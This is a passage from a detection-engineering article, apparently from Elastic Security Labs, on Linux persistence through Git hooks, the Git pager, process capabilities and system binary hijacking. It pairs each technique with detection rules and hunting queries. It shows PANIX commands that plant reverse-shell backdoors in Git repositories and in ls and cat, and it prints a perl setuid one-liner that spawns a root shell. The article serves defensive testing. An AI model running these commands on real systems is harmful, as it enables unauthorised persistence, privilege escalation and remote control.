Git\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://manpages.debian.org/stretch/git-man/git.1.en.html\",rel:\"nofollow\",children:\"Git\"}),\" is a distributed version control system widely used for managing source code and coordinating collaborative software development. It tracks changes to files and enables efficient team collaboration across different locations. This makes Git a system that is present in a lot of organizations across both workstations and servers. Two functionalities that can be (ab)used for arbitrary code execution are \",(0,t.jsx)(e.a,{href:\"https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks\",rel:\"nofollow\",children:\"Git hooks\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://www.mslinn.com/git/200-git-pager.html\",rel:\"nofollow\",children:\"Git pager\"}),\". MITRE has no specific technique attributed to these persistence mechanisms, but they would best fit \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/\",rel:\"nofollow\",children:\"T1546\"}),\".\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"t1546---event-triggered-execution-git-hooks\",children:\"T1546 - event triggered execution: Git hooks\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks\",rel:\"nofollow\",children:\"Git hooks\"}),\" are scripts that Git executes before or after specific events such as commits, merges, and pushes. These hooks are stored in the \",(0,t.jsx)(e.code,{children:\".git/hooks/\"}),\" directory within each Git repository. They provide a mechanism for customizing and automating actions during the Git workflow. Common Git hooks include \",(0,t.jsx)(e.code,{children:\"pre-commit\"}),\", \",(0,t.jsx)(e.code,{children:\"post-commit\"}),\", \",(0,t.jsx)(e.code,{children:\"pre-merge\"}),\", and \",(0,t.jsx)(e.code,{children:\"post-merge\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"An example of a Git hook would be the file \",(0,t.jsx)(e.code,{children:\".git/hooks/pre-commit\"}),\", with the following contents:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`#!/bin/sh\n# Check if this is the initial commit\nif git rev-parse --verify HEAD \u003e/dev/null 2\u003e\u00261\nthen\n    echo \"pre-commit: About to create a new commit...\"\n    against=HEAD\nelse\n    echo \"pre-commit: About to create the first commit...\"\n    against=4b825dc642cb6eb9a060e54bf8d69288fbee4904\nfi\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"As these scripts are executed on specific actions, and the contents of the scripts can be changed in whatever way the user wants, this method can be abused for persistence. Additionally, this method does not require root privileges, making it a convenient persistence technique for instances where root privileges are not yet obtained. These scripts can also be added to Github repositories prior to cloning, turning them into initial access vectors as well.\"}),`\n`,(0,t.jsx)(e.h3,{id:\"t1546---event-triggered-execution-git-pager\",children:\"T1546 - event triggered execution: git pager\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"A \",(0,t.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/Terminal_pager\",rel:\"nofollow\",children:\"pager\"}),\" is a program used to view content one screen at a time. It allows users to scroll through text files or command output without the text scrolling off the screen. Common pagers include \",(0,t.jsx)(e.a,{href:\"https://www.commandlinux.com/man-page/man1/pager.1.html\",rel:\"nofollow\",children:\"less\"}),\", \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/more.1.html\",rel:\"nofollow\",children:\"more\"}),\", and \",(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/pg.1.html\",rel:\"nofollow\",children:\"pg\"}),\". A \",(0,t.jsx)(e.a,{href:\"https://www.mslinn.com/git/200-git-pager.html\",rel:\"nofollow\",children:\"Git pager\"}),\" is a specific use of a pager program to display the output of Git commands. Git allows users to configure a pager to control the display of commands such as \",(0,t.jsx)(e.code,{children:\"git log\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Git determines which pager to use through the following order of configuration:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"/etc/gitconfig\"}),\" (system-wide)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"~/.gitconfig\"}),\" or \",(0,t.jsx)(e.code,{children:\"~/.config/git/config\"}),\" (user-specific)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\".git/config\"}),\" (repository specific)\"]}),`\n`]}),`\n`,(0,t.jsx)(e.p,{children:\"A typical configuration where a pager is specified might look like this:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`[core]\n    pager = less\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this example, Git is configured to use less as the pager. When a user runs a command like \",(0,t.jsx)(e.code,{children:\"git log\"}),\", Git will pipe the output through less for easier viewing. The flexibility in specifying a pager can be exploited. For example, an attacker can set the pager to a command that executes arbitrary code. This can be done by modifying the \",(0,t.jsx)(e.code,{children:\"core.pager\"}),\" configuration to include malicious commands. Let\\u2019s take a look at the two techniques discussed in this section.\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"persistence-through-t1546---git\",children:\"Persistence through T1546 - Git\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"To test these techniques, the system requires a cloned Git repository. There is no point in setting up a custom repository, as the persistence mechanism depends on user actions, making a hidden and unused Git repository an illogical construct. You could initialize your own hidden repository and chain it together with a \",(0,t.jsx)(e.code,{children:\"cron\"}),\"/\",(0,t.jsx)(e.code,{children:\"systemd\"}),\"/\",(0,t.jsx)(e.code,{children:\"udev\"}),\" persistence mechanism to initialize the repository on set intervals, but that is out of scope for now.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"To test the Git Hook technique, ensure a Git repository is available on the system, and run:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e ./panix.sh --git --default --ip 192.168.1.1 --port 2014 --hook\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:\"\u003e [+] Created malicious pre-commit hook in /home/ruben/panix\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"The program loops through the entire filesystem (as far as this is possible, based on permissions), finds all of the repositories, and backdoors them. To trigger the backdoor, run \",(0,t.jsx)(e.code,{children:\"git add -A\"}),\" and \",(0,t.jsx)(e.code,{children:'git commit -m \"backdoored!\"'}),\". This will generate the following events:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image3.png\",alt:\"Events generated as a result of the Git Hook persistence establishment\",title:\"Events generated as a result of the Git Hook persistence establishment\",width:\"2016\",height:\"1170\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this figure we see PANIX looking for Git repositories, adding a \",(0,t.jsx)(e.code,{children:\"pre-commit\"}),\" hook and granting it execution permissions, successfully planting the backdoor. Next, the backdoor is initiated through the \",(0,t.jsx)(e.code,{children:\"git commit\"}),\", and the \",(0,t.jsx)(e.code,{children:\"git\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"pre-commit\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"bash\"}),\" reverse shell connection is initiated.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"To test the Git pager technique, ensure a Git repository is available on the system and run:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e ./panix.sh --git --default --ip 192.168.1.1 --port 2015 --pager\n\u003e [+] Updated existing Git config with malicious pager in /home/ruben/panix\n\u003e [+] Updated existing global Git config with malicious pager \n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"To trigger the payload, move into the backdoored repository and run a command such as \",(0,t.jsx)(e.code,{children:\"git log\"}),\". This will trigger the following events:\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image15.png\",alt:\"Events generated as a result of the Git Pager persistence establishment\",title:\"Events generated as a result of the Git Pager persistence establishment\",width:\"2011\",height:\"1274\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"PANIX executes and starts searching for Git repositories. Once found, the configuration files are updated or created, and the backdoor is planted. Invoking the Git Pager (\",(0,t.jsx)(e.code,{children:\"less\"}),\") executes the backdoor, setting up the \",(0,t.jsx)(e.code,{children:\"git\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"sh\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,t.jsx)(e.code,{children:\"bash\"}),\" reverse connection chain.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"We have several layers of detection, covering the Git Hook/Pager persistence techniques.\"}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_file_creation.toml\",rel:\"nofollow\",children:\"Git Hook Created or Modified\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Process\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_process_execution.toml\",rel:\"nofollow\",children:\"Git Hook Child Process\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_execution.toml\",rel:\"nofollow\",children:\"Git Hook Command Execution\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_evasion_linux_binary.toml\",rel:\"nofollow\",children:\"Linux Restricted Shell Breakout via Linux Binary(s)\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Network\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_git_hook_netcon.toml\",rel:\"nofollow\",children:\"Git Hook Egress Network Connection\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-persistence-through-t1546---git\",children:\"Hunting for persistence through T1546 - Git\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Hunting for Git Hook/Pager persistence can be conducted through ES|QL and OSQuery. Potential indicators include file creations in the \",(0,t.jsx)(e.code,{children:\".git/hook/\"}),\" directories, Git Hook executions, and the modification/creation of Git configuration files. The \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_git_hook_pager.toml\",rel:\"nofollow\",children:\"Git Hook/Pager Persistence\"}),\" hunting rule has several ES|QL and OSQuery queries that will aid in detecting this technique.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1548---abuse-elevation-control-mechanism-process-capabilities\",children:\"T1548 - abuse elevation control mechanism: process capabilities\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man7/capabilities.7.html\",rel:\"nofollow\",children:\"Process capabilities\"}),\" are a fine-grained access control mechanism that allows the division of the root user's privileges into distinct units. These capabilities can be independently enabled or disabled for processes, and are used to enhance security by limiting the privileges of processes. Instead of granting a process full root privileges, only the necessary capabilities are assigned, reducing the risk of exploitation. This approach follows the principle of least privilege.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"To better understand them, some use cases for process capabilities are e.g. assigning \",(0,t.jsx)(e.code,{children:\"CAP_NET_BIND_SERVICE\"}),\" to a web server that needs to bind to port 80, assigning \",(0,t.jsx)(e.code,{children:\"CAP_NET_RAW\"}),\" to tools that need access to network interfaces or assigning \",(0,t.jsx)(e.code,{children:\"CAP_DAC_OVERRIDE\"}),\" to backup software requiring access to all files. By leveraging these capabilities, processes are capable of performing tasks that are usually only possible with root access.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"While process capabilities were developed to enhance security, once root privileges are acquired, attackers can abuse them to maintain persistence on a compromised system. By setting specific capabilities on binaries or scripts, attackers can ensure their malicious processes can operate with elevated privileges and allow for an easy way back to root access in case of losing it. Additionally, misconfigurations may allow attackers to escalate privileges.\"}),`\n`,(0,t.jsx)(e.p,{children:\"Some process capabilities can be (ab)used to establish persistence, escalate privileges, access sensitive data, or conduct other tasks. Process capabilities that can do this include, but are not limited to:\"}),`\n`,(0,t.jsxs)(e.ul,{children:[`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"CAP_SYS_MODULE\"}),\" (allows loading/unloading of kernel modules)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"CAP_SYS_PTRACE\"}),\" (enables tracing and manipulation of other processes)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"CAP_DAC_OVERRIDE\"}),\" (bypasses read/write/execute checks)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"CAP_DAC_READ_SEARCH\"}),\" (grants read access to any file on the system)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"CAP_SETUID\"}),\"/\",(0,t.jsx)(e.code,{children:\"CAP_SETGID\"}),\" (manipulate UID/GID)\"]}),`\n`,(0,t.jsxs)(e.li,{children:[(0,t.jsx)(e.code,{children:\"CAP_SYS_ADMIN\"}),\" (to be honest, this just means root access)\"]}),`\n`]}),`\n`,(0,t.jsxs)(e.p,{children:[\"A simple way of establishing persistence is to grant the process \",(0,t.jsx)(e.code,{children:\"CAP_SETUID\"}),\" or \",(0,t.jsx)(e.code,{children:\"CAP_SETGID\"}),\" capabilities (this is similar to setting the \",(0,t.jsx)(e.code,{children:\"SUID\"}),\"/\",(0,t.jsx)(e.code,{children:\"SGID\"}),\" bit to a process, which we discussed in \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"the previous persistence blog\"}),\"). But all of the ones above can be used, be a bit creative here! MITRE does not have a technique dedicated to process capabilities. Similar to Setuid/Setgid, this technique can be leveraged for both privilege escalation and persistence. The most logical technique to add this mechanism to (based on the existing structure of the MITRE ATT\u0026CK framework) would be \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1548/\",rel:\"nofollow\",children:\"T1548\"}),\".\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"persistence-through-t1548---process-capabilities\",children:\"Persistence through T1548 - process capabilities\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Let\\u2019s leverage PANIX to set up a process with \",(0,t.jsx)(e.code,{children:\"CAP_SETUID\"}),\" process capabilities by running:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --cap --default\n[+] Capability setuid granted to /usr/bin/perl\n[-] ruby, is not present on the system.\n[-] php is not present on the system.\n[-] python is not present on the system.\n[-] python3, is not present on the system.\n[-] node is not present on the system. \n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"PANIX will by-default check for a list of processes that are easily exploitable after granting \",(0,t.jsx)(e.code,{children:\"CAP_SETUID\"}),\" capabilities. You can use \",(0,t.jsx)(e.code,{children:\"--custom\"}),\" and specify \",(0,t.jsx)(e.code,{children:\"--capability\"}),\" and \",(0,t.jsx)(e.code,{children:\"--binary\"}),\" to test some of your own.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"If your system has \",(0,t.jsx)(e.code,{children:\"Perl\"}),\", you can take a look at \",(0,t.jsx)(e.a,{href:\"https://gtfobins.github.io/gtfobins/perl/\",rel:\"nofollow\",children:\"GTFOBins\"}),\" to find how to escalate privileges with this capability set.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n# whoami\nroot\n`})}),`\n`,(0,t.jsx)(e.p,{children:\"Looking at the logs in Discover, we can see the following happening:\"}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image13.png\",alt:\"Events generated as a result of the Linux capability persistence establishment\",title:\"Events generated as a result of the Linux capability persistence establishment\",width:\"2954\",height:\"1019\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"We can see PANIX being executed with \",(0,t.jsx)(e.code,{children:\"uid=0\"}),\" (root), which grants \",(0,t.jsx)(e.code,{children:\"cap_setuid+ep\"}),\" (effective and permitted) to \",(0,t.jsx)(e.code,{children:\"/usr/bin/perl\"}),\". Effective indicates that the capability is currently active for the process, while permitted indicates that the capability is allowed to be used by the process. Note that all events with \",(0,t.jsx)(e.code,{children:\"uid=0\"}),\" have all effective/permitted capabilities set. After granting this capability and dropping down to user permissions, \",(0,t.jsx)(e.code,{children:\"perl\"}),\" is executed and manipulates its own process UID to obtain root access. Feel free to try out different binaries/permissions.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"As we have quite an extensive list of rules related to process capabilities (for discovery, persistence and privilege escalation activity), we will not list all of them here. Instead, you can take a look at \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/unlocking-power-safely-privilege-escalation-via-linux-process-capabilities\",rel:\"nofollow\",children:\"this blog post\"}),\", digging deeper into this topic.\"]}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-persistence-through-t1548---process-capabilities\",children:\"Hunting for persistence through T1548 - process capabilities\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Hunting for process capability persistence can be done through ES|QL. We can either do a general hunt and find non uid 0 binaries with capabilities set, or hunt for specific potentially dangerous capabilities. To do so, we created the \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_process_capabilities.toml\",rel:\"nofollow\",children:\"Process Capability Hunting\"}),\" rule.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"t1554---compromise-host-software-binary-hijacking-system-binaries\",children:\"T1554 - compromise host software binary: hijacking system binaries\"}),`\n`,(0,t.jsx)(e.p,{children:\"After gaining access to a system and, if necessary, escalating privileges to root access, system binary hijacking/wrapping is another option to establish persistence. This method relies on the trust and frequent execution of system binaries by a user.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"System binaries, located in directories like \",(0,t.jsx)(e.code,{children:\"/bin\"}),\", \",(0,t.jsx)(e.code,{children:\"/sbin\"}),\", \",(0,t.jsx)(e.code,{children:\"/usr/bin\"}),\", and \",(0,t.jsx)(e.code,{children:\"/usr/sbin\"}),\" are commonly used by users/administrators to perform basic tasks. Attackers can hijack these system binaries by replacing or backdooring them with malicious counterparts. System binaries that are used often such as \",(0,t.jsx)(e.code,{children:\"cat\"}),\", \",(0,t.jsx)(e.code,{children:\"ls\"}),\", \",(0,t.jsx)(e.code,{children:\"cp\"}),\", \",(0,t.jsx)(e.code,{children:\"mv\"}),\", \",(0,t.jsx)(e.code,{children:\"less\"}),\" or \",(0,t.jsx)(e.code,{children:\"sudo\"}),\" are perfect candidates, as this mechanism relies on the user executing the binary.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"There are multiple ways to establish persistence through this method. The attacker may manipulate the system\\u2019s \",(0,t.jsx)(e.code,{children:\"$PATH\"}),\" environment variable to prioritize a malicious binary over the regular system binary. Another method would be to replace the real system binary, executing arbitrary malicious code on launch, after which the regular command is executed.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Attackers can be creative in leveraging this technique, as any code can be executed. For example, the system-wide \",(0,t.jsx)(e.code,{children:\"sudo\"}),\"/\",(0,t.jsx)(e.code,{children:\"su\"}),\" binaries can be backdoored to capture a password every time a user attempts to run a command with \",(0,t.jsx)(e.code,{children:\"sudo\"}),\". Another method can be to establish a reverse connection every time a binary is executed or a backdoor binary is called on each binary execution. As long as the attacker hides well and no errors are presented to the user, this technique is difficult to detect. MITRE does not have a direct reference to this technique, but it probably fits \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1554/\",rel:\"nofollow\",children:\"T1554\"}),\" best.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Let\\u2019s take a look at what hijacking system binaries might look like.\"}),`\n`,(0,t.jsx)(e.h3,{id:\"persistence-through-t1554---hijacking-system-binaries\",children:\"Persistence through T1554 - hijacking system binaries\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"The implementation of system binary hijacking in PANIX leverages the wrapping of a system binary to establish a reverse connection to a specified IP. You can reference this \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/main/panix.sh#L2391-L2401\",rel:\"nofollow\",children:\"example\"}),\" or set it up by executing:\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`\u003e sudo ./panix.sh --system-binary --default --ip 192.168.1.1 --port 2016\n\u003e [+] cat backdoored successfully.\n\u003e [+] ls backdoored successfully.\n`})}),`\n`,(0,t.jsxs)(e.p,{children:[\"Now, execute \",(0,t.jsx)(e.code,{children:\"ls\"}),\" or \",(0,t.jsx)(e.code,{children:\"cat\"}),\" to establish persistence. Let\\u2019s analyze the logs.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/sequel-on-persistence-mechanisms/image11.png\",alt:\"Events generated as a result of the Linux system binary hijacking persistence establishment\",title:\"Events generated as a result of the Linux system binary hijacking persistence establishment\",width:\"2005\",height:\"1196\"})}),`\n`,(0,t.jsxs)(e.p,{children:[\"In the figure above we see PANIX executing, moving \",(0,t.jsx)(e.code,{children:\"/usr/bin/ls\"}),\" to \",(0,t.jsx)(e.code,{children:\"/usr/bin/ls.original\"}),\". It then backdoors \",(0,t.jsx)(e.code,{children:\"/usr/bin/ls\"}),\" to execute arbitrary code, after which it calls \",(0,t.jsx)(e.code,{children:\"/usr/bin/ls.original\"}),\" in order to trick the user. Afterwards, we see \",(0,t.jsx)(e.code,{children:\"bash\"}),\" setting up the reverse connection. The copying/renaming of system binaries and the hijacking of the \",(0,t.jsx)(e.code,{children:\"sudo\"}),\" binary are captured in the following detection rules.\"]}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{children:\"Category\"}),(0,t.jsx)(e.th,{children:\"Coverage\"})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File\"}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml\",rel:\"nofollow\",children:\"System Binary Moved or Copied\"})})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{}),(0,t.jsx)(e.td,{children:(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_sudo_hijacking.toml\",rel:\"nofollow\",children:\"Potential Sudo Hijacking\"})})]})]})]})}),`\n`,(0,t.jsx)(e.h3,{id:\"hunting-for-persistence-through-t1554---hijacking-system-binaries\",children:\"Hunting for persistence through T1554 - hijacking system binaries\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"This activity should be very uncommon, and therefore the detection rules above can be leveraged for hunting. Another way of hunting for this activity could be assembling a list of uncommon binaries to spawn child processes. To aid in this process we created the \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_unusual_system_binary_parent.toml\",rel:\"nofollow\",children:\"Unusual System Binary Parent (Potential System Binary Hijacking Attempt)\"}),\" hunting rule.\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this part of our \\u201CLinux Detection Engineering\\u201D series, we explored more advanced Linux persistence techniques and detection strategies, including init systems, run control scripts, message of the day, udev (rules), package managers, Git, process capabilities, and system binary hijacking. If you missed the previous part on persistence, catch up \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:\"here\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"We did not only explain each technique but also demonstrated how to implement them using \",(0,t.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\". This hands-on approach allowed you to assess detection capabilities in your own security setup. Our discussion included detection and endpoint rule coverage and referenced effective hunting strategies, from ES|QL aggregation queries to live OSQuery hunts.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"We hope you've found this format informative. Stay tuned for more insights into Linux detection engineering. Happy hunting!\"})]})}function k(i={}){let{wrapper:e}=i.components||{};return e?(0,t.jsx)(e,Object.assign({},i,{children:(0,t.jsx)(d,i)})):d(i)}var x=k;return w(_);})();\n;return Component;"},"_id":"articles/sequel-on-persistence-mechanisms.mdx","_raw":{"sourceFilePath":"articles/sequel-on-persistence-mechanisms.mdx","sourceFileName":"sequel-on-persistence-mechanisms.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/sequel-on-persistence-mechanisms"},"type":"Article","imageUrl":"/assets/images/sequel-on-persistence-mechanisms/sequel-on-persistence-mechanisms.jpg","readingTime":"48 min read","series":"","url":"/sequel-on-persistence-mechanisms","headings":[{"level":2,"title":"Introduction","href":"#introduction"},{"level":2,"title":"Setup note","href":"#setup-note"},{"level":2,"title":"T1037 - boot or logon initialization scripts: Init","href":"#t1037---boot-or-logon-initialization-scripts-init"},{"level":3,"title":"T1037 - boot or logon initialization scripts: System V init","href":"#t1037---boot-or-logon-initialization-scripts-system-v-init"},{"level":3,"title":"BEGIN INIT INFO","href":"#begin-init-info"},{"level":3,"title":"END INIT INFO","href":"#end-init-info"},{"level":4,"title":"Persistence through T1037 - System V init","href":"#persistence-through-t1037---system-v-init"},{"level":4,"title":"Hunting for T1037 - System V init","href":"#hunting-for-t1037---system-v-init"},{"level":3,"title":"T1037 - boot or logon initialization scripts: Upstart","href":"#t1037---boot-or-logon-initialization-scripts-upstart"},{"level":2,"title":"T1037.004 - boot or logon initialization scripts: run control (RC) scripts","href":"#t1037004---boot-or-logon-initialization-scripts-run-control-rc-scripts"},{"level":3,"title":"Persistence through T1037.004 - run control (RC) scripts","href":"#persistence-through-t1037004---run-control-rc-scripts"},{"level":3,"title":"Hunting for T1037.004 - run control (RC) scripts","href":"#hunting-for-t1037004---run-control-rc-scripts"},{"level":2,"title":"T1037 - boot or logon initialization scripts: Message of the Day (MOTD)","href":"#t1037---boot-or-logon-initialization-scripts-message-of-the-day-motd"},{"level":3,"title":"Persistence through T1037 - message of the day (MOTD)","href":"#persistence-through-t1037---message-of-the-day-motd"},{"level":3,"title":"Hunting for T1037 - message of the day (MOTD)","href":"#hunting-for-t1037---message-of-the-day-motd"},{"level":2,"title":"T1546 - event triggered execution: udev","href":"#t1546---event-triggered-execution-udev"},{"level":2,"title":"Persistence through T1546 - udev","href":"#persistence-through-t1546---udev"},{"level":3,"title":"Hunting for T1546 - udev","href":"#hunting-for-t1546---udev"},{"level":2,"title":"T1546.016 - event triggered execution: installer packages","href":"#t1546016---event-triggered-execution-installer-packages"},{"level":3,"title":"T1546.016 - installer packages (APT)","href":"#t1546016---installer-packages-apt"},{"level":4,"title":"Persistence through T1546.016 - installer packages (APT)","href":"#persistence-through-t1546016---installer-packages-apt"},{"level":3,"title":"T1546.016 - installer packages (YUM)","href":"#t1546016---installer-packages-yum"},{"level":4,"title":"Persistence through T1546.016 - Installer Packages (YUM)","href":"#persistence-through-t1546016---installer-packages-yum"},{"level":3,"title":"T1546.016 - installer packages (DNF)","href":"#t1546016---installer-packages-dnf"},{"level":4,"title":"Persistence through T1546.016 - installer packages (DNF)","href":"#persistence-through-t1546016---installer-packages-dnf"},{"level":3,"title":"Hunting for persistence through T1546.016 - installer packages","href":"#hunting-for-persistence-through-t1546016---installer-packages"},{"level":2,"title":"T1546 - event triggered execution: Git ","href":"#t1546---event-triggered-execution-git-"},{"level":3,"title":"T1546 - event triggered execution: Git hooks","href":"#t1546---event-triggered-execution-git-hooks"},{"level":3,"title":"T1546 - event triggered execution: git pager","href":"#t1546---event-triggered-execution-git-pager"},{"level":3,"title":"Persistence through T1546 - Git","href":"#persistence-through-t1546---git"},{"level":3,"title":"Hunting for persistence through T1546 - Git","href":"#hunting-for-persistence-through-t1546---git"},{"level":2,"title":"T1548 - abuse elevation control mechanism: process capabilities","href":"#t1548---abuse-elevation-control-mechanism-process-capabilities"},{"level":3,"title":"Persistence through T1548 - process capabilities","href":"#persistence-through-t1548---process-capabilities"},{"level":3,"title":"Hunting for persistence through T1548 - process capabilities","href":"#hunting-for-persistence-through-t1548---process-capabilities"},{"level":2,"title":"T1554 - compromise host software binary: hijacking system binaries","href":"#t1554---compromise-host-software-binary-hijacking-system-binaries"},{"level":3,"title":"Persistence through T1554 - hijacking system 